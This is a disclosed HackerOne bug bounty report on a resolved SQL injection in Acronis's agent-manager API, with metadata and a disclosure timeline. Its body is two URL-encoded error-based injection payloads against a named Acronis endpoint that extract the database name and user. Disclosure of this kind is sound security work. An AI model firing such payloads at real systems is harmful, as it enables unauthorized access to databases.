---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/sql-injection
  - env/web
substate: "resolved"
weakness: "SQL Injection"
enriched: true
body: true
date: 2021-08-16
submitted: 2020-08-20T02:36:05.140Z
bounty_usd: null
votes: 237
cve: []
program: "[[programs/acronis|Acronis]]"
reporter: "bourbon"
source: "https://hackerone.com/reports/962889"
title: "SQL Injection in agent-manager"
---
# SQL Injection in agent-manager

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 237 | **Program:** Acronis | **Disclosed:** 2021-08-16

- Report: [https://hackerone.com/reports/962889](https://hackerone.com/reports/962889)
- CWE: SQL Injection
- Submitted: 2020-08-20T02:36:05.140Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

1.https://mc-beta-cloud.acronis.com/api/agent_manager/v2/unit_configurations?name=update-schedule&no_data=false&tenant_id=1590228&unit=atp-agent%27and%2F%2A%2A%2Fextractvalue%281%2Cconcat%28char%28126%29%2C%28select+database%28%29%29%29%29and%27
2.https://mc-beta-cloud.acronis.com/api/agent_manager/v2/unit_configurations?name=update-schedule&no_data=false&tenant_id=1590228&unit=atp-agent%27and%2F%2A%2A%2Fextractvalue%281%2Cconcat%28char%28126%29%2C%28select+user%28%29%29%29%29and%27

## Impact

sql injection

## Timeline

- **Report Filed**
- **2020-08-20** @iradostev: Hi @bourbon 

Thanks for participating in Acronis bug bounty program!
We will review the report and come back to you asap.
- **Report Title Updated**
- **Report Triaged**
- **Bounty Awarded**
- **Report Resolved**
- **Agreed On Going Public**
- **2021-08-11** @bourbon: OK!
- **2021-08-16** @stushieva: Hi @bourbon,

Can you please agree to disclose the report if you are okay with it, https://docs.hackerone.com/hackers/disclosure.html
- **Agreed On Going Public**
- **Report Became Public**
